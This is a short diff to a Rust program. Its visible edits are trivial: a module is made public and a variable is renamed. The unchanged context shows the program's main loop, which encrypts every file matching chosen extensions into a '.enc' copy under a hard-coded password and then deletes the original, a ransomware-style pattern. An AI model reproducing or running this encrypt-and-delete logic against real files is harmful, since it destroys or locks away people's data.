@@ -1,4 +1,4 @@
-mod build;
+pub mod build;
 
 use std::fs::{File, remove_file};
 use std::io::{BufWriter, Read, Write};
@@ -149,7 +149,7 @@ fn main() {
                 .map(|ext| extensions.contains(&ext))
                 .unwrap_or(false)
         }) {
-        let encrypted_file = encrypt_large_file(entry.path().to_str().unwrap_or(""), &format!("{}{}", entry.path().to_str().unwrap_or(""), ".enc" ), "password".to_owned());
+        let _encrypted_filee = encrypt_large_file(entry.path().to_str().unwrap_or(""), &format!("{}{}", entry.path().to_str().unwrap_or(""), ".enc" ), "password".to_owned());
         let _ = remove_file(entry.path());
     }
 }
